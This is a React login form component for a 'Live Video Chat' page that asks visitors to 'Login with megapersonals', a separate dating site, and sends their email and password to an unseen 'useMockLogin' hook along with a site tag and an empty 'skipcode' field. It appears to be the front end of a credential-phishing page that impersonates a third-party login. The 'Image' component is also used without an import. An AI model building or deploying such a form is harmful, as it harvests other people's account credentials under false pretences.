'use client'
import { Field, Form, Formik } from "formik";
import { useState } from "react";
import { toast } from "react-toastify";
import { site } from "../config";
import useMockLogin from "../hooks/useMockLogin";
function LoginForm({ setShowModal }) {
  const initialvalues = {
    email: "",
    password: "",
    remember: "",
  };

  const { login } = useMockLogin({ setShowModal });

  const handleSubmit = (values, formik) => {
    const { email, password } = values;

    // console.log("values", values);
    // return;

    const submitValues = {
      site: site,
      email: email,
      password: password,
      skipcode: "",
    };

    login(submitValues, formik);

    // console.log(submitValues);
  };

  return (
    <div className="px-5 lg:px-10 pt-5 pb-10 md:w-[420px] bg-white w-[400px] shadow-lg rounded-lg">
      <div className="px-8 md:px-12">
        <h3 className="text-[32px] font-bold text-[#2b044d] text-center">
          Live Video Chat
        </h3>

        <p className="mt-[15px] text-lg leading-tight font-medium ">
          Login with megapersonals and enjoy with{" "}
          <span className="text-[#2b044d] font-bold">
            Private Live Video Chat
          </span>{" "}
          your dating partner.
        </p>
      </div>

      <div className="mt-5">
        <Formik
          initialValues={initialvalues}
          // validationSchema={validate}
          onSubmit={handleSubmit}
        >
          {(formik) => (
            <Form className="">
              <Field
                className="w-full text-lg px-[8px] py-[7px] outline-none border border-slate-300 shadow-inner placeholder:font-medium placeholder:text-black/50"
                placeholder="Your email"
                name="email"
                type="email"
                required
              />
              <Field
                className="mt-5 w-full text-lg  px-[8px] py-[7px] outline-none border border-slate-300 shadow-inner placeholder:font-medium placeholder:text-black/50"
                placeholder="Password"
                name="password"
                type="password"
                autoComplete="on"
                required
              />

              <button
                className="bg-[#58C2FC] text-white text-lg  flex items-center gap-10 lg:gap-5 px-5 py-[6px] rounded-md w-full"
                type="submit"
              >
                <div className="relative w-10 h-10 rounded-md overflow-hidden">
                  <Image
                    src="/images/logo-potrait.jpg"
                    alt="potrait"
                    fill
                    className="object-cover"
                  />
                </div>
                <p className="">Login with megapersonals</p>
              </button>
            </Form>
          )}
        </Formik>
      </div>
    </div>
  );
}

export default LoginForm;
